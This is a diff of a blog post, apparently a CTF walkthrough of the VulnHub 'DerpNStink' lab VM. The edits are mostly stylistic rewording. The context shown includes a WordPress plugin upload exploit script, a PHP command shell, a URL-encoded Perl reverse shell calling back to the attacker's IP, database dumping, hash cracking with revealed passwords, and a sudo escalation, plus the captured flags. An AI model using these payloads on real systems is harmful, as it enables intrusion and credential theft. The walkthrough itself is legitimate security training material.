@@ -1,6 +1,6 @@
 ---
 layout: post
-date: 2018-03-28 17:54:26 +0000 
+date: 2018-03-28 17:54:26 +0000
 title: "Misfortune in South Park"
 category: Walkthrough
 tags: [VulnHub, "DerpNStink"]
@@ -30,25 +30,25 @@ Let's kick this off with a `nmap` scan to establish the services available in th
 PORT   STATE SERVICE REASON         VERSION
 21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.2
 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
 |   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
 |   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
 |_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (EdDSA)
 80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
-| http-methods: 
+| http-methods:
 |_  Supported Methods: OPTIONS GET HEAD POST
-| http-robots.txt: 2 disallowed entries 
+| http-robots.txt: 2 disallowed entries
 |_/php/ /temporary/
 |_http-server-header: Apache/2.4.7 (Ubuntu)
 |_http-title: DeRPnStiNK
 ```
 
-My usual game plan is to target the web service first, especially if `nmap` tells me that `robots.txt` exists. Let's start with that.
+My usual game plan is to target the web service first whenever `nmap` tells me that `robots.txt` exists. Let's start with that.
 
 ### HTML Source
 
-Using `curl` and some `grep`-fu on the HTML source, the first flag was captured pretty easily.
+Using `curl` and some `grep`-fu on the HTML source, I captured the first flag. Easy.
 
 ```
 # curl -s 192.168.10.130 | grep -P 'href=|src=|<!?--' | sed -r 's/^\s+//'
@@ -148,9 +148,9 @@ PING derpnstink.local (127.0.0.1) 56(84) bytes of data.
 --- derpnstink.local ping statistics ---
 7 packets transmitted, 7 received, 0% packet loss, time 5998ms
 rtt min/avg/max/mdev = 0.015/0.022/0.026/0.003 ms
-stinky@DeRPnStiNK:~$ 
+stinky@DeRPnStiNK:~$
 ```
-The following was noted:
+From above, I noted the following:
 
 * The FQDN of the host is `derpnstink.local`; and
 * User `stinky` exists; and
@@ -158,7 +158,7 @@ The following was noted:
 
 ### Directory/File Enumeration
 
-Using `gobuster` with one of the big wordlists for a quick enumeration, these additional directories were found.
+Using `gobuster` with one of the big wordlists for a quick enumeration, I found these  directories.
 
 ```
 Gobuster v1.2                OJ Reeves (@TheColonial)
@@ -181,7 +181,7 @@ http://192.168.10.130/temporary (Status: 301)
 
 Both `/php` and `/temporary` were already listed in `robots.txt`.
 
-Using `gobuster` and `common.txt` from [SecLists](https://github.com/danielmiessler/SecLists), further directories were found.
+Using `gobuster` and `common.txt` from [SecLists](https://github.com/danielmiessler/SecLists), I found more directories.
 
 ```
 http://192.168.10.130/php/info.php (Status: 200)
@@ -208,14 +208,14 @@ Content-Type: text/html; charset=UTF-8
 There was also another hint from `/webnotes/info.txt` to do likewise.
 
 ```
-<-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live --> 
+<-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live -->
 ```
 
 ### Slideshow Gallery < 1.4.7 Arbitrary File Upload
 
-Using `wpscan`, it was extremely simple to enumerate vulnerable WordPress plugins. As it turned out, this particular version (1.4.6) had an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/).
+Using `wpscan`, it's simple to enumerate vulnerable WordPress plugins. As it turned out, this particular version (1.4.6) had an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/).
 
-I wrote `upload.sh`, a `bash` script that does just that.
+I wrote `upload.sh`, a `bash` script to upload files based on the vulnerability.
 
 {% highlight bash linenos %}
 #!/bin/bash
@@ -260,7 +260,7 @@ curl \
 rm -rf cookie
 {% endhighlight %}
 
-A simple PHP file that executes remote command was uploaded using the script.
+I uploaded a simple PHP file that executes remote command with the script.
 
 ```
 # cat cmd.php
@@ -283,7 +283,7 @@ Since we are passing the above command to `cmd.php`, it's best to `urlencode` it
 http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.10.129%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
 ```
 
-On my end, I just need to set up my `netcat` listener and wait for the shell.
+On my end, I need to set up my `netcat` listener and wait for the shell.
 
 ![screenshot-1](/assets/images/posts/derpnstink-walkthrough/screenshot-1.png)
 
@@ -293,7 +293,7 @@ Let's spawn a pseudo-TTY for better display and output control.
 
 ### Database Dump
 
-Now that I've access to a low privilege shell, let's dump the WordPress database. The database configuration parameters should be located in the WordPress directory.
+Now that I've access to a low privilege shell, let's dump the WordPress database. I should be able to locate the database configuration parameters in the WordPress directory.
 
 ![screenshot-3](/assets/images/posts/derpnstink-walkthrough/screenshot-3.png)
 
@@ -317,7 +317,7 @@ Let's proceed to dump and view the database.
 $ mysqldump -uroot -pmysql wordpress > /tmp/dump.txt
 ```
 
-Two things stood out from the dump: **second flag** and **password hashes**.
+The **second flag** and **password hashes** stood out from the dump.
 
 ```
 'flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)','Flag.txt','','draft','open','open'
@@ -333,7 +333,7 @@ Using John the Ripper with a wordlist like "rockyou" on Kali Linux, cracking Wor
 
 ```
 # john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-# john --show hashes.txt 
+# john --show hashes.txt
 unclestinky:wedgie57:::::
 admin:admin:::::
 ```
@@ -342,7 +342,7 @@ admin:admin:::::
 Remember that we are still in the low-privileged shell? And since `/etc/passwd` is world-readable, let's enumerate the users in the host.
 
 ```
-$ cat /etc/passwd 
+$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 ...
 sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
@@ -355,9 +355,9 @@ Let's see if we can login to Uncle Stinky's account with the password (`wedgie57
 
 ![screenshot-4](/assets/images/posts/derpnstink-walkthrough/screenshot-4.png)
 
-During enumeration of Uncle Stinky's account, the third flag was discovered at `/home/stinky/Desktop/flag.txt`.
+During enumeration of Uncle Stinky's account, I discovered the third flag at `/home/stinky/Desktop/flag.txt`.
 
-Enumerating further, a conversation between Mr. Derp and Uncle Stinky was uncovered. It appeared that Mr. Derp couldn't login to WordPress and Uncle Stinky has captured some network traffic to assist in troubleshooting the issue.
+Enumerating further, I uncovered a conversation between Mr. Derp and Uncle Stinky. It appeared that Mr. Derp couldn't login to WordPress and Uncle Stinky has captured some network traffic to assist in troubleshooting the issue.
 
 ```
 $ cd ~/ftp/files/network-logs
@@ -378,7 +378,7 @@ $ cat derpissues.txt
 12:20 stinky: done! yay
 ```
 
-``` 
+```
 $ cd ~/Documents
 $ tcpdump -nt -r derpissues.pcap -A 2>/dev/null | grep -P 'pwd='
 log=unclestinky%40derpnstink.local&pwd=wedgie57&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1
@@ -389,7 +389,7 @@ Let's login to Mr. Derp's account with the password (`derpderpderpderpderpderpde
 
 ![screenshot-5](/assets/images/posts/derpnstink-walkthrough/screenshot-5.png)
 
-A helpdesk ticket was uncovered during the enumeration of Mr. Derp's account. Apparently, Mr. Derp had an issue with `sudoer`. 
+I uncovered a helpdesk ticket during the enumeration of Mr. Derp's account. Apparently, Mr. Derp had an issue with `sudoer`.
 
 ```
 $ cd /support
@@ -406,7 +406,7 @@ How can I exclude these commands from password protection to sudo?
 
 
 ********************************************************************
-Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket. 
+Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket.
 
 Please contact the Client Support team at https://pastebin.com/RzK9WfGw if you have any further questions or issues.
 
@@ -415,7 +415,7 @@ Thank you for using our product.
 ********************************************************************
 ```
 
-The resolution can be found at `https://pastebin.com/RzK9WfGw`.
+I found the resolution at `https://pastebin.com/RzK9WfGw`.
 
 ![screenshot-6](/assets/images/posts/derpnstink-walkthrough/screenshot-6.png)
 
@@ -438,13 +438,13 @@ And since we already knew the password to Mr. Derp's account.
 
 Boom.
 
-The fourth flag was discovered at `/root/Desktop/flag.txt`.
+I discovered the fourth flag at `/root/Desktop/flag.txt`.
 
 :dancer:
 
 ### Flags
 
-All the flags were captured.
+All the captured flags :smirk:
 
 ```
 flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)
